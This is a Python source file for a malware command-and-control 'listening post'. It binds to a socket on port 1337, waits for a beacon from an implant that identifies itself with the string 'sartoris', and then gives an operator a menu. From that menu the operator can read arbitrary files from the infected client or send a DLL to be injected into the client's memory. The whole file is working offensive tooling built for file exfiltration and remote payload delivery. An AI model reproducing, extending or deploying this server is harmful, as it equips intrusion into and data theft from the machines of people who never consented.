#!/usr/bin/python3

# Simple LP for .dll malware
# messages to client are of the form (type, length, value)
# Where:
# 	tag = 4 bytes
#	length = 4 bytes
#   value = tag dependent data type

# Options are:
# 0: Quit
# 1: UNINMPLEMENTED
# 2: Read a remote file
# 3: UNINMPLEMENTED
# 4: Load a .dll file into memory

import socket
import binascii
import socket
from struct import *
import sys
import os.path
from pathlib import Path

# Receive the client connection on port 1337
SERVER_PORT = 1337
BUFFER_SIZE = 1024

# Define message types. Need to work out what message types are.
# Also if the client expects them in network order, etc
TYPE1 = 0x04
TYPE2 = 0x06
TYPE3 = 0x06
DLL_TYPE = 0x08

# Max DLL File size
MAX_FILE_SIZE = 0xFFFFFFFF


print("***** Python .dll listening post *****\n")
print("Starting the listening post. . . \n")
# Create a socket that we will listen on
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Stop the socket from complaing about address alredy in use
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
# Bind and listen on host address
s.bind(('10.1.20.40', SERVER_PORT))
s.listen(1)
print("Server started.\n")

# Eventually here you'd want to start a new thread for each received beacon
print("Please wait while we receive a beacon from the client. . .\n")

# Wait for connect
conn, addr = s.accept()
print("Got connection from: ", addr)

# Get data
data = conn.recv(BUFFER_SIZE)
# If we get empty ACK then close the connection and exit
if not data:
	print("Got no data from client, exiting . . .\n")
	conn.close()
	exit()

# Receive ACK string "sartoris" sent by client
if('sartoris' in str(data)):
	print("Received ACK string: ", data)
else:
	print("Did not receive proper ACK from client, exiting. . .")
	conn.close()
	exit()

# Eventually here we want a menu that lists all beaconing clients with
# IP, Port, hostname, OS, etc and allow us to choose from a list of ones we
# want to interact, or even send commands to multiple clients at once
while True:
	print("Please select a command to send to ", addr)
	print("(0) Quit\n(1) UNINMPLEMENTED\n(2) Read a file \
		\n(3) UNINMPLEMENTED\n(4) Memory Inject DLL\n")
	# Get user input, store it in choice
	choice = input(">>> ").rstrip()

	# If choice isn't a positive number re-prompt
	if not choice.isdigit():
		print("You must specify a valid digit 0-4!\n")

	else:
		# Check if input is an int	
		try:
			user_input = int(choice)
		except ValueError:
			print("You must enter a number!")

		# If choice isn't a value from 0 to 4
		if user_input < 0 or user_input > 4:
			print("Please select a number 0-4!\n")
		# User chose Quit
		elif user_input == 0:
			print("Exiting . . .\n")
			break

		# We choose option 1
		elif user_input == 1:
			# Simple payload to echo back "sartoris"
			TYPE1_PAYLOAD = pack('i', TYPE1)
			TYPE1_PAYLOAD += pack('i', 8)
			TYPE1_PAYLOAD += pack('8s', b'sartoris')
			print("Sending payload of type1: ", TYPE1_PAYLOAD)
			conn.send(TYPE1_PAYLOAD)
			# See if client responds
			print("Listening for response from client: \n")
			data = conn.recv(BUFFER_SIZE)
			print("Got data: ", data)

		# We choose option 2: Read a file from client
		elif user_input == 2:
			print("Please enter the filename to read")
			# Get the filename from the user
			file2read = input(">>>")
			# Store the length of the filename
			file_length = len(file2read)
			# Pack the message type so we can send it
			TYPE2_PAYLOAD = pack('i', TYPE2)
			# Pack the length of the string: the file we want to read
			TYPE2_PAYLOAD += pack('i', file_length)

			# Pack each byte of the string as binary data
			file2read.encode('ascii')
			for c in bytes(file2read, 'ascii'):
				TYPE2_PAYLOAD += pack('c', bytes([c]))

			# Send the message
			print("Sending payload of type: ", TYPE2)
			conn.send(TYPE2_PAYLOAD)
			print("Sent: ", TYPE2_PAYLOAD)
			# See if client responds
			print("Listening for response from client: \n")
			data = conn.recv(BUFFER_SIZE)
			print("Got data: ", data)

		# We choose option 3 UNINMPLEMENTED	
		elif user_input == 3:
			print("Got choice 3")
			TYPE3_PAYLOAD = pack('i', TYPE3)
			TYPE3_PAYLOAD += pack('i', 8)
			TYPE3_PAYLOAD += pack('8s', b'sartoris')
			conn.send(TYPE3_PAYLOAD)
			# See if client responds
			print("Listening for response from client: \n")
			data = conn.recv(BUFFER_SIZE)
			print("Got data: ", data)

		# Option 4 to load a .dll file into memory
		elif user_input == 4:
			# Prompt for user input
			print("Enter the name of the dll to load")
			filename = input(">>> ")

			# Open the file in binary mode
			f = open(filename, 'rb')

			# Get the integer file size of the file
			length = os.path.getsize(filename)

			# get the file bytes count, store it in  "length"
			# pack the file bytes into a variable
			# send it out as type, length, value
			print(length)

			packed_data = pack('i', DLL_TYPE)
			# >i for length gives mem access error
			# i and <i for length gives no feedback, and no crash
			packed_data += pack('i', length)

			# Read each byte one by one from the file and pack it
			try:
				byte = f.read(1)
				while byte != b'':
					# Pack the byte into the variable
					packed_data += pack('c', byte)
					byte = f.read(1)
			finally:
				f.close()
			# Send <tag, length, dll data>
			print("Sending payload of type: ", TYPE2)
			conn.send(packed_data)
			print('Sent: "%s"' % binascii.hexlify(packed_data))

			print("Listening for response from client: \n")
			data = conn.recv(BUFFER_SIZE)
			print("Got data: ", data)
			conn.close()
			# listen for response

		else:
			print("Didn't understand input")
		

